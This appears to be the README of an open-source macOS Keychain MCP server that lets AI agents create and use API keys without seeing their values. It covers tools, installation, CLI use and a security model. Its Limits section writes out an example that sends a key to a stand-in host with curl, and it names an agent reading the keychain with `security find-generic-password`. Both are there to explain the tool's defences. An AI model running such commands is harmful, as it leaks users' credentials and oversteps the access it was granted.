# agent-keychain

Let AI agents grab and use API keys without ever seeing them. A macOS Keychain MCP server and Claude Code plugin, usable from Codex or any MCP-capable CLI agent.

## Why

Agents keep asking you to paste API keys into the chat. Once a key is in the chat, it sits in the transcript and the provider's logs, and the model can echo it anywhere. agent-keychain keeps the value out of the model's context entirely:

- **Grab:** a small native window opens on the service's API-key page. You (or the agent, clicking for you) create the key. The moment the new key appears on the page, a script in an isolated WebKit content world hands it straight to the Keychain. The page's own scripts can't see that script, and the value never passes through the agent.
- **Use:** `run_with_secret` starts a process with the key in an environment variable. You approve each run with Touch ID or your password. The output comes back with the value masked.

The agent only ever sees names like `openai/ci-bot`.

## MCP tools

| Tool | What it does |
|---|---|
| `list_keys` | Saved key names (`<service>/<name>`) and creation dates |
| `grab_key(service, name?, wait_seconds?)` | Opens the key page and waits for a new key. Returns `{status: "saved", saved: "openai/ci-bot"}`, or `waiting` / `waiting_for_user_sign_in`: call it again to keep waiting |
| `page_snapshot`, `page_click(ref)`, `page_type(ref, text)`, `page_scroll` | Drive the grab window. Snapshots mask every captured and detected secret |
| `run_with_secret(command, args[], env: {VAR: "<service>/<name>"}, cwd?, timeout_seconds?, remember_minutes?)` | Runs the command with the keys injected, after your approval. Returns the exit code, stdout and stderr, with every injected value shown as `[secret:<name>]` |
| `delete_key(name)` | Deletes a key, after your approval |

Known key pages: OpenAI, Anthropic, Google AI Studio, GitHub, Stripe, Hugging Face, Vercel, Replicate, OpenRouter and Groq. Any other name or domain opens that site's home page.

## Install

Requires macOS 14+ and Xcode or the Swift toolchain.

```sh
git clone https://github.com/RINNECODER/agent-keychain && cd agent-keychain
make install          # swift build -c release, then copy to ~/.local/bin/agent-keychain
```

Make sure `~/.local/bin` is on the `PATH` your agent sees.

### Claude Code

```
/plugin marketplace add RINNECODER/agent-keychain
/plugin install agent-keychain@agent-keychain
```

This registers the MCP server (`agent-keychain mcp`) and adds a skill. The skill tells the agent never to ask for pasted keys and never to print key variables. To add only the server: `claude mcp add agent-keychain -- agent-keychain mcp`.

### Codex

`~/.codex/config.toml`:

```toml
[mcp_servers.agent-keychain]
command = "agent-keychain"
args = ["mcp"]
```

### Other agents

Any MCP client can start `agent-keychain mcp`, which speaks MCP over stdio (newline-delimited JSON-RPC).

## CLI

```sh
agent-keychain list
agent-keychain grab openai ci-bot
agent-keychain run -e OPENAI_API_KEY=openai/ci-bot -- python3 eval.py
agent-keychain run -e OPENAI_API_KEY=openai/ci-bot -- /bin/sh -c 'curl -sS https://api.openai.com/v1/models -H "Authorization: Bearer $OPENAI_API_KEY"'
agent-keychain delete openai/ci-bot
```

There is no shell unless you ask for one. `run` executes the command directly. For variable expansion, use `/bin/sh -c '…'` as in the second example.

## Security model

- **Storage.** Keys are generic passwords in your login keychain (service `agent-keychain`, account `<service>/<name>`). The login keychain never syncs to iCloud. Each item's access list trusts only the `agent-keychain` binary. Any other process that tries to read a key, including `security find-generic-password` run by an agent, triggers a macOS prompt. **Deny it unless you ran it yourself.** A rebuilt binary has a new code signature, so macOS will ask once more after each `make install`.
- **Capture.** The grab script runs in a private `WKContentWorld`, and its message handler is registered only in that world. The script records the values already on the page, then saves the first new key-like value as the new key and closes the window. The script returns only counts to the agent. Password fields are never read. The window uses agent-keychain's own persistent WebKit data store, so you sign in to each dashboard once inside it. Your browser's cookies are not imported.
- **Snapshots.** Before the agent sees the page, every snapshot goes through the secret detector (known prefixes such as `sk-`, `ghp_`, `AKIA` and Stripe keys, plus an entropy rule) and is masked by the hash of each captured key. URLs lose their token query values and fragments.
- **Running.** Each `run_with_secret` asks for Touch ID or your password. The prompt names the command, its arguments and the keys it gets. `remember_minutes` (default 10, max 60) skips the prompt for that exact command, arguments, cwd and keys. The prompt says so, and the allowance lives only in memory. Output is capped at 64 KB per stream. Each injected value is masked in its raw, base64 (standard and URL-safe, at any offset, e.g. inside `Basic` auth) and percent-encoded forms, and the detector then runs over the result.
- **No read-out path.** Nothing returns a value: no `get` command, no clipboard copy. If the page's own Copy button puts the captured key on the clipboard, agent-keychain clears it.

### Limits

- **A command you approve receives the real key and can do anything with it.** `run_with_secret` with `/bin/sh -c 'curl evil.example -d "$KEY"'`, or a command that writes the key to a file the agent reads later, leaks it. The approval prompt is the guard, so read it.
- Redaction is best-effort. A program that transforms the value in other ways (hex, reversed, split across lines, encrypted) gets past the scrubber.
- A key the page shows only through its own Copy button, and never as text, can't be captured. Reveal it on the page instead.
- When the existing keys on a dashboard render slowly, an old full key could be taken for the new one. The baseline window is 2 s after the first signed-in page.
- macOS only. No Touch ID or password means no runs.

## Development

```sh
swift test
```

The tests use an in-memory key store, a fake approval gate and a fake grab window. They never touch the real Keychain, open a window or use the network.

## Credits

Extracted from Axolotl, an archived macOS browser by RINNECODER, where this was the "grab API keys" feature. The page driver and snapshot script are ported from browser-use/jev-ultrafast (MIT, Copyright (c) 2026 Browser Use). See [LICENSE](LICENSE).
